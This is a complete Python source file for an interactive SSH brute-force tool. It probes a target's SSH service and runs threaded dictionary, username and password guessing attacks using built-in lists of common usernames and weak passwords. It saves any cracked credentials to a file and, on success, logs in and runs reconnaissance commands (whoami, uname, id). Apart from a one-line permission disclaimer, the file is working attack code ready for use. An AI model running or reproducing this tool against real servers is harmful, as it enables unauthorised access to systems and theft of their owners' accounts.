#!/usr/bin/env python3
"""
SSH Cracker Tool
Attempt to crack SSH credentials using brute force attacks
"""

import os
import socket
import time
import threading
from concurrent.futures import ThreadPoolExecutor, as_completed
from colorama import Fore, Style
from tqdm import tqdm
import paramiko

class SSHCracker:
    def __init__(self):
        self.common_usernames = [
            'root', 'admin', 'administrator', 'user', 'guest', 'test',
            'ubuntu', 'debian', 'centos', 'oracle', 'postgres', 'mysql',
            'apache', 'nginx', 'www-data', 'ftp', 'mail', 'operator',
            'ssh', 'daemon', 'bin', 'sys', 'sync', 'games', 'man',
            'lp', 'mail', 'news', 'uucp', 'proxy', 'www-data', 'backup',
            'list', 'irc', 'gnats', 'nobody', 'systemd-network',
            'systemd-resolve', 'syslog', 'messagebus', 'uuidd', 'dnsmasq',
            'usbmux', 'rtkit', 'pulse', 'speech-dispatcher', 'avahi',
            'saned', 'colord', 'hplip', 'geoclue', 'gnome-initial-setup',
            'gdm', 'tomcat', 'jenkins', 'git', 'svn', 'cvs', 'deploy'
        ]
        
        self.common_passwords = [
            'password', '123456', '123456789', 'qwerty', 'abc123',
            'password123', 'admin', 'letmein', 'welcome', 'monkey',
            '1234567890', 'password1', '123123', 'qwerty123', 'password!',
            'admin123', 'root', 'toor', 'pass', 'test', 'guest',
            'user', 'login', 'default', 'changeme', 'secret',
            'master', 'freedom', 'whatever', 'qazwsx', 'trustno1',
            '123qwe', '1q2w3e4r', 'zxcvbnm', 'iloveyou', 'starwars',
            'football', 'baseball', 'shadow', 'superman', 'azerty',
            'root123', 'admin123', 'password123', '123456', 'toor',
            'server', 'client', 'terminal', 'console', 'shell'
        ]
        
        self.found_credentials = []
        self.lock = threading.Lock()
        self.stop_attack = False
    
    def clear_screen(self):
        """Clear the terminal screen"""
        os.system('cls' if os.name == 'nt' else 'clear')
    
    def display_banner(self):
        """Display tool banner"""
        print(Fore.CYAN + "=" * 60)
        print(Fore.YELLOW + "           🔐 SSH CRACKER TOOL")
        print(Fore.CYAN + "=" * 60)
        print(Fore.GREEN + "Attempt to crack SSH credentials")
        print(Fore.RED + "⚠️  Use only on systems you own or have permission to test!")
        print(Fore.CYAN + "=" * 60 + Style.RESET_ALL)
        print()
    
    def validate_target(self, target):
        """Validate IP address or hostname"""
        try:
            # Try to parse as IP address
            socket.inet_aton(target)
            return True, "Valid IP address"
        except socket.error:
            # Try to resolve as hostname
            try:
                socket.gethostbyname(target)
                return True, "Valid hostname"
            except socket.gaierror:
                return False, "Invalid hostname or IP address"
    
    def test_ssh_connection(self, target, port, username, password, timeout=5):
        """Test SSH credentials"""
        if self.stop_attack:
            return None
        
        try:
            # Create SSH client
            ssh = paramiko.SSHClient()
            ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            
            # Attempt connection
            ssh.connect(target, port=port, username=username, password=password, 
                       timeout=timeout, allow_agent=False, look_for_keys=False)
            
            # If we reach here, authentication was successful
            ssh.close()
            
            return {
                'target': target,
                'port': port,
                'username': username,
                'password': password
            }
            
        except paramiko.AuthenticationException:
            # Authentication failed - wrong credentials
            return None
        except paramiko.SSHException as e:
            # SSH protocol error
            if "Authentication failed" in str(e):
                return None
            else:
                return None
        except socket.timeout:
            # Connection timeout
            return None
        except socket.error:
            # Network error
            return None
        except Exception:
            # Other errors
            return None
    
    def check_ssh_service(self, target, port=22, timeout=5):
        """Check if SSH service is running"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(timeout)
            result = sock.connect_ex((target, port))
            sock.close()
            
            if result == 0:
                # Try to get SSH banner
                try:
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.settimeout(timeout)
                    sock.connect((target, port))
                    banner = sock.recv(1024).decode('utf-8', errors='ignore').strip()
                    sock.close()
                    return True, banner
                except:
                    return True, "SSH service detected"
            else:
                return False, "Connection refused"
                
        except Exception:
            return False, "Error checking service"
    
    def get_ssh_info(self, target, port=22):
        """Get SSH server information"""
        try:
            # Get SSH banner
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(5)
            sock.connect((target, port))
            banner = sock.recv(1024).decode('utf-8', errors='ignore').strip()
            sock.close()
            
            info = {
                'banner': banner,
                'version': 'Unknown'
            }
            
            # Extract SSH version from banner
            if 'SSH-' in banner:
                version_parts = banner.split()
                if len(version_parts) >= 2:
                    info['version'] = version_parts[1]
            
            return info
            
        except Exception:
            return {'banner': 'Unknown', 'version': 'Unknown'}
    
    def generate_combinations(self, usernames, passwords):
        """Generate username/password combinations"""
        combinations = []
        for username in usernames:
            for password in passwords:
                combinations.append((username, password))
        return combinations
    
    def dictionary_attack(self, target, port, usernames, passwords, max_threads=10):
        """Perform dictionary attack"""
        combinations = self.generate_combinations(usernames, passwords)
        print(Fore.CYAN + f"[*] Starting dictionary attack with {len(combinations)} combinations...")
        
        with ThreadPoolExecutor(max_workers=max_threads) as executor:
            futures = {executor.submit(self.test_ssh_connection, target, port, username, password): (username, password) 
                      for username, password in combinations}
            
            with tqdm(total=len(futures), desc="Testing credentials", 
                     bar_format="{l_bar}{bar}| {n_fmt}/{total_fmt}") as pbar:
                
                for future in as_completed(futures):
                    if self.stop_attack:
                        break
                    
                    try:
                        result = future.result()
                        if result:
                            with self.lock:
                                self.found_credentials.append(result)
                            print(Fore.GREEN + f"\n[+] VALID CREDENTIALS FOUND: {result['username']}:{result['password']}" + Style.RESET_ALL)
                    except Exception:
                        pass
                    
                    pbar.update(1)
        
        return self.found_credentials
    
    def username_bruteforce(self, target, port, usernames, password, max_threads=10):
        """Bruteforce usernames with a single password"""
        print(Fore.CYAN + f"[*] Testing {len(usernames)} usernames with password: {password}")
        
        with ThreadPoolExecutor(max_workers=max_threads) as executor:
            futures = {executor.submit(self.test_ssh_connection, target, port, username, password): username 
                      for username in usernames}
            
            with tqdm(total=len(futures), desc="Testing usernames", 
                     bar_format="{l_bar}{bar}| {n_fmt}/{total_fmt}") as pbar:
                
                for future in as_completed(futures):
                    if self.stop_attack:
                        break
                    
                    try:
                        result = future.result()
                        if result:
                            with self.lock:
                                self.found_credentials.append(result)
                            print(Fore.GREEN + f"\n[+] VALID CREDENTIALS FOUND: {result['username']}:{result['password']}" + Style.RESET_ALL)
                    except Exception:
                        pass
                    
                    pbar.update(1)
        
        return self.found_credentials
    
    def password_bruteforce(self, target, port, username, passwords, max_threads=10):
        """Bruteforce passwords for a single username"""
        print(Fore.CYAN + f"[*] Testing {len(passwords)} passwords for username: {username}")
        
        with ThreadPoolExecutor(max_workers=max_threads) as executor:
            futures = {executor.submit(self.test_ssh_connection, target, port, username, password): password 
                      for password in passwords}
            
            with tqdm(total=len(futures), desc="Testing passwords", 
                     bar_format="{l_bar}{bar}| {n_fmt}/{total_fmt}") as pbar:
                
                for future in as_completed(futures):
                    if self.stop_attack:
                        break
                    
                    try:
                        result = future.result()
                        if result:
                            with self.lock:
                                self.found_credentials.append(result)
                            print(Fore.GREEN + f"\n[+] VALID CREDENTIALS FOUND: {result['username']}:{result['password']}" + Style.RESET_ALL)
                    except Exception:
                        pass
                    
                    pbar.update(1)
        
        return self.found_credentials
    
    def load_wordlist(self, filepath):
        """Load usernames or passwords from file"""
        try:
            with open(filepath, 'r', encoding='utf-8', errors='ignore') as f:
                items = [line.strip() for line in f if line.strip()]
            return items
        except Exception as e:
            print(Fore.RED + f"[-] Error loading wordlist: {e}")
            return None
    
    def save_results(self, results, attack_type, duration):
        """Save cracking results to file"""
        try:
            filename = f"ssh_crack_results_{int(time.time())}.txt"
            
            with open(filename, 'w') as f:
                f.write(f"SSH Cracking Results\n")
                f.write(f"====================\n\n")
                f.write(f"Attack Type: {attack_type}\n")
                f.write(f"Duration: {duration:.2f} seconds\n")
                f.write(f"Date: {time.strftime('%Y-%m-%d %H:%M:%S')}\n")
                f.write(f"Valid Credentials Found: {len(results)}\n\n")
                
                if results:
                    f.write("Target\tPort\tUsername\tPassword\n")
                    f.write("-" * 50 + "\n")
                    
                    for cred in results:
                        f.write(f"{cred['target']}\t{cred['port']}\t{cred['username']}\t{cred['password']}\n")
                else:
                    f.write("No valid credentials found.\n")
            
            print(Fore.GREEN + f"[+] Results saved to: {filename}")
        except Exception as e:
            print(Fore.RED + f"[-] Error saving results: {e}")
    
    def display_results(self, results):
        """Display found credentials"""
        if not results:
            print(Fore.YELLOW + "[*] No valid credentials found")
            return
        
        print(Fore.GREEN + f"\n[+] Found {len(results)} valid credential(s):")
        print()
        
        # Table header
        print(f"{'Target':<15} {'Port':<6} {'Username':<15} {'Password'}")
        print("-" * 60)
        
        for cred in results:
            print(f"{cred['target']:<15} {cred['port']:<6} {cred['username']:<15} {cred['password']}")
    
    def run(self):
        """Main tool execution"""
        self.clear_screen()
        self.display_banner()
        
        while True:
            try:
                print(Fore.CYAN + "\n[*] SSH Cracker Menu:")
                print("1. Dictionary Attack (usernames + passwords)")
                print("2. Username Bruteforce")
                print("3. Password Bruteforce")
                print("4. Common Credentials Attack")
                print("5. Back to main menu")
                
                choice = input(Fore.YELLOW + "\nSelect attack type (1-5): " + Style.RESET_ALL).strip()
                
                if choice == '5':
                    return
                
                # Get target
                target = input(Fore.YELLOW + "\nEnter target IP or hostname: " + Style.RESET_ALL).strip()
                
                if not target:
                    print(Fore.RED + "[-] Please enter a target!")
                    continue
                
                is_valid, message = self.validate_target(target)
                if not is_valid:
                    print(Fore.RED + f"[-] {message}")
                    continue
                
                # Get port
                port_input = input(Fore.YELLOW + "Enter SSH port (default=22): " + Style.RESET_ALL).strip()
                try:
                    port = int(port_input) if port_input else 22
                    if port < 1 or port > 65535:
                        print(Fore.RED + "[-] Invalid port number!")
                        continue
                except ValueError:
                    print(Fore.RED + "[-] Invalid port number!")
                    continue
                
                # Check SSH service
                print(Fore.CYAN + f"\n[*] Checking SSH service on {target}:{port}...")
                service_running, service_info = self.check_ssh_service(target, port)
                
                if not service_running:
                    print(Fore.RED + f"[-] SSH service not available: {service_info}")
                    continue
                
                print(Fore.GREEN + f"[+] SSH service detected: {service_info}")
                
                # Get SSH server info
                ssh_info = self.get_ssh_info(target, port)
                print(Fore.GREEN + f"[+] SSH Version: {ssh_info['version']}")
                
                # Reset for new attack
                self.found_credentials = []
                self.stop_attack = False
                
                if choice == '1':
                    # Dictionary attack
                    print(Fore.CYAN + "\n[*] Dictionary Attack Configuration")
                    
                    # Get usernames
                    username_file = input(Fore.YELLOW + "Enter username wordlist file (press Enter for built-in): " + Style.RESET_ALL).strip()
                    if username_file and os.path.exists(username_file):
                        usernames = self.load_wordlist(username_file)
                        if usernames:
                            print(Fore.GREEN + f"[+] Loaded {len(usernames)} usernames")
                        else:
                            usernames = self.common_usernames
                    else:
                        usernames = self.common_usernames
                        print(Fore.YELLOW + "[*] Using built-in username list")
                    
                    # Get passwords
                    password_file = input(Fore.YELLOW + "Enter password wordlist file (press Enter for built-in): " + Style.RESET_ALL).strip()
                    if password_file and os.path.exists(password_file):
                        passwords = self.load_wordlist(password_file)
                        if passwords:
                            print(Fore.GREEN + f"[+] Loaded {len(passwords)} passwords")
                        else:
                            passwords = self.common_passwords
                    else:
                        passwords = self.common_passwords
                        print(Fore.YELLOW + "[*] Using built-in password list")
                    
                    # Warning for large combinations
                    total_combinations = len(usernames) * len(passwords)
                    if total_combinations > 10000:
                        print(Fore.YELLOW + f"[*] Warning: Testing {total_combinations:,} combinations may take a while!")
                        proceed = input(Fore.YELLOW + "Continue? (y/n): " + Style.RESET_ALL).strip().lower()
                        if proceed != 'y':
                            continue
                    
                    start_time = time.time()
                    results = self.dictionary_attack(target, port, usernames, passwords)
                    end_time = time.time()
                    attack_type = "Dictionary Attack"
                
                elif choice == '2':
                    # Username bruteforce
                    username_file = input(Fore.YELLOW + "Enter username wordlist file (press Enter for built-in): " + Style.RESET_ALL).strip()
                    if username_file and os.path.exists(username_file):
                        usernames = self.load_wordlist(username_file)
                        if usernames:
                            print(Fore.GREEN + f"[+] Loaded {len(usernames)} usernames")
                        else:
                            usernames = self.common_usernames
                    else:
                        usernames = self.common_usernames
                    
                    password = input(Fore.YELLOW + "Enter password to test: " + Style.RESET_ALL).strip()
                    if not password:
                        print(Fore.RED + "[-] Please enter a password!")
                        continue
                    
                    start_time = time.time()
                    results = self.username_bruteforce(target, port, usernames, password)
                    end_time = time.time()
                    attack_type = "Username Bruteforce"
                
                elif choice == '3':
                    # Password bruteforce
                    password_file = input(Fore.YELLOW + "Enter password wordlist file (press Enter for built-in): " + Style.RESET_ALL).strip()
                    if password_file and os.path.exists(password_file):
                        passwords = self.load_wordlist(password_file)
                        if passwords:
                            print(Fore.GREEN + f"[+] Loaded {len(passwords)} passwords")
                        else:
                            passwords = self.common_passwords
                    else:
                        passwords = self.common_passwords
                    
                    username = input(Fore.YELLOW + "Enter username to test: " + Style.RESET_ALL).strip()
                    if not username:
                        print(Fore.RED + "[-] Please enter a username!")
                        continue
                    
                    start_time = time.time()
                    results = self.password_bruteforce(target, port, username, passwords)
                    end_time = time.time()
                    attack_type = "Password Bruteforce"
                
                elif choice == '4':
                    # Common credentials attack
                    start_time = time.time()
                    results = self.dictionary_attack(target, port, 
                                                    self.common_usernames[:10], 
                                                    self.common_passwords[:10])
                    end_time = time.time()
                    attack_type = "Common Credentials Attack"
                
                else:
                    print(Fore.RED + "[-] Invalid choice!")
                    continue
                
                duration = end_time - start_time
                
                # Display results
                print(Fore.CYAN + f"\n[*] Attack completed in {duration:.2f} seconds")
                self.display_results(results)
                
                # Save results
                if results:
                    self.save_results(results, attack_type, duration)
                    
                    # Ask if user wants to test connection
                    if len(results) > 0:
                        test_connection = input(Fore.YELLOW + "\nTest SSH connection with found credentials? (y/n): " + Style.RESET_ALL).strip().lower()
                        if test_connection == 'y':
                            self.test_connection_interactive(results[0])
                
                print()
                another = input(Fore.YELLOW + "Attack another target? (y/n): " + Style.RESET_ALL).strip().lower()
                if another != 'y':
                    break
                    
            except KeyboardInterrupt:
                print(Fore.RED + "\n[*] Attack interrupted by user")
                self.stop_attack = True
                break
            except Exception as e:
                print(Fore.RED + f"[-] Error: {e}")
                continue
    
    def test_connection_interactive(self, credentials):
        """Test SSH connection interactively"""
        try:
            print(Fore.CYAN + f"\n[*] Testing SSH connection with {credentials['username']}:{credentials['password']}")
            
            ssh = paramiko.SSHClient()
            ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            ssh.connect(credentials['target'], port=credentials['port'], 
                       username=credentials['username'], password=credentials['password'], 
                       timeout=10)
            
            print(Fore.GREEN + "[+] Connection successful!")
            
            # Execute some basic commands
            try:
                stdin, stdout, stderr = ssh.exec_command('whoami')
                whoami = stdout.read().decode().strip()
                print(Fore.GREEN + f"[+] Current user: {whoami}")
                
                stdin, stdout, stderr = ssh.exec_command('uname -a')
                uname = stdout.read().decode().strip()
                print(Fore.GREEN + f"[+] System info: {uname}")
                
                stdin, stdout, stderr = ssh.exec_command('id')
                uid = stdout.read().decode().strip()
                print(Fore.GREEN + f"[+] User ID: {uid}")
                
            except Exception as e:
                print(Fore.YELLOW + f"[*] Could not execute commands: {e}")
            
            ssh.close()
            
        except Exception as e:
            print(Fore.RED + f"[-] Connection failed: {e}")
            